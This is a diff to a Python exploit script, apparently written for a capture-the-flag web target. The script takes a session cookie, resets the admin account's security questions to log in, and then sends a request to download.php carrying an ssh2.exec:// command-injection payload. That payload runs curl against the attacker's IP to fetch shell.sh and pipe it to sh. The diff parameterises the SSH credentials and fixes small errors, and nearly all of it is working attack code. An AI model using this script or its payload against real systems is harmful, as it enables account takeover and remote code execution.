@@ -10,7 +10,7 @@ def get_cookie(url: str, user: str, passwd: str) -> str | None:
         cookie: str = r1.cookies.get("PHPSESSID")
         print("Cookie:", cookie)
     except requests.exceptions.RequestException as e:
-        print("Error", e)
+        print("Error:", e)
         return None
     return cookie
 
@@ -26,32 +26,38 @@ def sub_main(url: str, admin_user: str, cookie: str, a1="hi", a2="hi", a3="hi") 
             r2 = requests.post(url + "/security_login.php", data=new_data, headers=headers)
             print("*Logged in with reseted questions")
     except requests.exceptions.RequestException as e:
-        print("Error", e)
+        print("Error:", e)
         return False
     return True
 
-def main(url: str, fid: int, ip_addr: str, cookie: str) -> bool:
-    payload: str = "id={}&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://{}:8000/shell.sh|sh%23".format(fid, ip_addr)
+def main(url: str, user: str, passwd: str, fid: int, ip_addr: str, cookie: str) -> bool:
+    payload: str = "id={0}&show=true&format=ssh2.exec://{1}:{2}@127.0.0.1/curl+-s+http://{3}:8000/shell.sh|sh%23".format(fid, user, passwd, ip_addr)
     headers: dict = {"Cookie": "PHPSESSID={}".format(cookie)}
     try:
-        print("Starting persistance...")
+        print("Starting persistence...")
         r = requests.get(url + "/download.php?" + payload, headers=headers)
     except requests.exceptions.RequestException as e:
-        print("Error", e)
+        print("Error:", e)
         return False
     return True
 
 if __name__ == "__main__":
-    if len(sys.argv) != 5:
-        print("Usage:", sys.argv[0], "<url> <username:password> <your_ip> <file_id>")
+    if len(sys.argv) != 6:
+        print("Usage:", sys.argv[0], "<url> <username:password> <ssh_username:ssh_password> <your_ip> <file_id>")
         sys.exit(1)
 
-    url: str = sys.argv[1]
+    url: str = sys.argv[1].lstrip("/")
     user, passwd = sys.argv[2].split(":")
-    ip_addr: str = sys.argv[3]
-    fid: int = sys.argv[4]
+    ssh_username, ssh_password = sys.argv[3].split(":")
+    ip_addr: str = sys.argv[4]
+    fid: int = int(sys.argv[5])
 
     admin_user: str = "admin_ef01cab31aa"
     cookie: str = get_cookie(url, user, passwd)
+    
+    if not cookie:
+        print("Failed to grab session cookie.")
+        sys.exit(1)
+
     if sub_main(url, admin_user, cookie):
-        main(url, fid, ip_addr, cookie)
+        main(url, ssh_username, ssh_password, fid, ip_addr, cookie)
